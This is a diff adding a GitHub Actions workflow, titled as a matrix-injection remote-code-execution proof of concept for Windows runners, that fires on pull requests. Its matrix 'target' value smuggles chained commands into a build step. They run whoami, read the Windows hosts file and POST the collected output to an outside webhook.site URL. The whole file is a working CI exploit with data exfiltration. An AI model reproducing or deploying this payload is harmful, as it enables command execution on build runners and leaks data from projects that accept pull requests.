@@ -1,0 +1,20 @@
+name: Matrix Injection RCE PoC (Windows)
+
+on:
+  pull_request:
+
+jobs:
+  matrix_rce:
+    runs-on: windows-2022
+    strategy:
+      matrix:
+        target: [
+          "rce && whoami > result.txt && echo -------------------- >> result.txt && type C:\\Windows\\System32\\drivers\\etc\\hosts >> result.txt && curl -s -X POST --data-binary @result.txt https://webhook.site/a813eb6c-e727-4da0-bf4d-b215c95a855a"
+        ]
+        compiler: ["noop"]
+        mode: ["noop"]
+    steps:
+      - name: Trigger Exploit via Matrix Injection
+        run: |
+          echo "Running: call build ${{ matrix.target }} ${{ matrix.compiler }} ${{ matrix.mode }}"
+          call build ${{ matrix.target }} ${{ matrix.compiler }} ${{ matrix.mode }} || exit /b 1
